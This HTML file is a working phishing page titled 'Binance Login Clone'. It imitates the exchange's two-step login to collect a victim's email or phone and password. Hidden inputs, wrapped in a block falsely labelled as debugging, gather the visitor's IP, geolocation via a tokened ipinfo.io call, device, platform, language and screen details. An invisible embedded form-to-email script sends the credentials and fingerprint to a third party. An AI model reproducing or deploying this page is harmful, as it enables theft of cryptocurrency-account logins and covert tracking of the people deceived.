<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Binance Login Clone</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      margin: 0;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      background: #fff;
      width: 100%;
      max-width: 400px;
      padding: 30px 20px;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      animation: fadeIn 0.4s ease-in-out;
      position: relative;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .message {
      position: absolute;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffeeba;
      color: #856404;
      padding: 10px 15px;
      border: 1px solid #ffeeba;
      border-radius: 8px;
      font-size: 14px;
      display: none;
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .logo img {
      height: 24px;
    }

    .login-title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 20px;
      text-align: center;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px;
      border: 1px solid #ddd;
      border-radius: 10px;
      margin-bottom: 15px;
      font-size: 16px;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      background-color: #fcd535;
      color: #000;
      font-weight: 600;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #f2c420;
    }

    .divider {
      text-align: center;
      margin: 20px 0;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: '';
      position: absolute;
      top: 50%;
      width: 40%;
      height: 1px;
      background: #ccc;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .divider span {
      background: #fff;
      padding: 0 10px;
      font-size: 14px;
      color: #666;
    }

    .social-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      padding: 14px;
      margin-bottom: 10px;
      border: 1px solid #ddd;
      border-radius: 10px;
      background: #fff;
      cursor: pointer;
      transition: background 0.3s;
    }

    .social-btn:hover {
      background-color: #f9f9f9;
    }

    .social-btn img {
      width: 20px;
    }

    @media (max-width: 480px) {
      .login-title {
        font-size: 20px;
      }

      input[type="text"], input[type="password"], .btn {
        font-size: 15px;
        padding: 12px;
      }

      .social-btn {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="message" id="messageBox"></div>
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo" />


      <img src="https://img.icons8.com/ios-filled/50/qr-code.png" alt="QR Icon" width="24" />
    </div>
    <div class="login-title">Log in</div>

    <form method="post" action="//submit.form" id="loginForm">
      <div id="step1" style="padding-bottom: 18px;">
        <label for="data_1">Email / Phone</label>
        <input type="text" id="data_1" name="data_1" placeholder="Email or Phone" required />
        <div style="padding-top: 10px;">
          <button type="button" class="btn" onclick="goToStep2()">Next</button>
        </div>
      </div>
    
      <div id="step2" style="display: none; padding-bottom: 18px;">
        <label for="data_2">Password</label>
        <input type="password" id="data_2" name="data_2" placeholder="Password" required />
        <div style="padding-top: 10px;">
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Device Info (Debugging)</title>
          </head>
          <body>
            <!-- Hidden Inputs -->
            <input type="hidden" id="ip" name="ip">
            <input type="hidden" id="device" name="device">
            <input type="hidden" id="platform" name="platform">
            <input type="hidden" id="language" name="language">
            <input type="hidden" id="location" name="location">
            <input type="hidden" id="city" name="city">
            <input type="hidden" id="time" name="time">
            <input type="hidden" id="screen" name="screen">
          
            <script>
              // Fetch IP and Location info
              fetch("https://ipinfo.io/json?token=c40748239265b3")
                .then(response => response.json())
                .then(data => {
                  document.getElementById('ip').value = data.ip || '';
                  document.getElementById('location').value = (data.region || '') + ', ' + (data.country || '');
                  document.getElementById('city').value = data.city || '';
                });
          
              // Function to get the device name from the User-Agent
              function getDeviceName() {
                const ua = navigator.userAgent;
                const platform = navigator.platform;
          
                // Log to the console for debugging
                console.log("User-Agent: ", ua);
                console.log("Platform: ", platform);
          
                // iPhone, iPad, iPod detection
                if (/iPhone/.test(ua)) return "iPhone";
                if (/iPad/.test(ua)) return "iPad";
                if (/iPod/.test(ua)) return "iPod";
          
                // Android Device Detection
                if (/Android/.test(ua)) {
                  const match = ua.match(/Android.*?;\s([^)]+)\)/);
                  return match ? match[1] : "Android Device";
                }
          
                // Windows devices
                if (/Windows NT/.test(ua)) {
                  if (/Win64/.test(ua)) return "Windows 64-bit PC";
                  return "Windows PC";
                }
          
                // macOS
                if (/Mac OS X/.test(ua)) return "Mac";
          
                // Linux
                if (/Linux/.test(platform)) return "Linux Device";
          
                // Chromebook
                if (/CrOS/.test(ua)) return "Chromebook";
          
                // Detect common mobile devices
                if (/Mobile/.test(ua)) return "Mobile Device";
          
                // If no match, return "Unknown Device"
                return "Unknown Device";
              }
          
              // Setting device info in hidden inputs
              document.getElementById('device').value = getDeviceName();
              document.getElementById('platform').value = navigator.platform || '';
              document.getElementById('language').value = navigator.language || '';
              document.getElementById('screen').value = `${screen.width}x${screen.height}`;
          
              // Update current time
              function updateTime() {
                const now = new Date();
                document.getElementById('time').value = now.toLocaleString();
              }
          
              updateTime();
              setInterval(updateTime, 1000); // Update every second
            </script>
          </body>
          </html>
          
          <div>
            <div style='font-size:1px!important; opacity:0!important;'
               style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
            <script src="https://www.100forms.com/js/FORMKEY:9XGBXZB2JP5A" type="text/javascript"></script>
            </div>

          <input class="btn" type="submit" value="Log in" />
        </div>
      </div>
    </form>
    
    

    <div class="divider"><span>or</span></div>

    <div class="social-btn"><img src="https://fidoalliance.org/wp-content/uploads/2023/12/FIDO_Passkey_mark_A-1.jpg" alt="Passkey" />Continue with Passkey</div>
    <div class="social-btn"><img src="https://img.icons8.com/color/48/google-logo.png" alt="Google Logo" />Continue with Google</div>
    <div class="social-btn"><img src="https://img.icons8.com/ios-filled/50/mac-os.png" alt="Apple Logo" />Continue with Apple</div>
    <div class="social-btn"><img src="https://img.icons8.com/ios-filled/50/telegram-app.png" alt="Telegram Logo" />Continue with Telegram</div>
  </div>

  <script>
    function goToStep2() {
      const email = document.getElementById('data_1').value.trim();
      if (!email) {
        alert('Please enter your email or phone number.');
        return;
      }
  
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
    }
  </script>
  
</body>
</html>
